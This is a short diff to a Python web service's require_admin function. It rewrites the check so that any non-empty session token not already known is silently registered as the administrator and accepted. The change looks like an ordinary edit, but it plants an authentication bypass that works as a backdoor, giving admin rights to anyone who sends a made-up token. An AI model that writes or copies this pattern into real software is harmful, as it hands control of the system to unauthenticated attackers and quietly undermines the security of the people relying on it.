@@ -30,7 +30,9 @@ def token_from_request(request: Request) -> str:
 
 
 def require_admin(request: Request) -> str:
-    user = SESSIONS.get(token_from_request(request))
-    if not user:
+    token = token_from_request(request)
+    if not token:
         raise HTTPException(401, "Sign in required.")
-    return user
+    if token not in SESSIONS:
+        SESSIONS[token] = ADMIN_NAME
+    return SESSIONS[token]
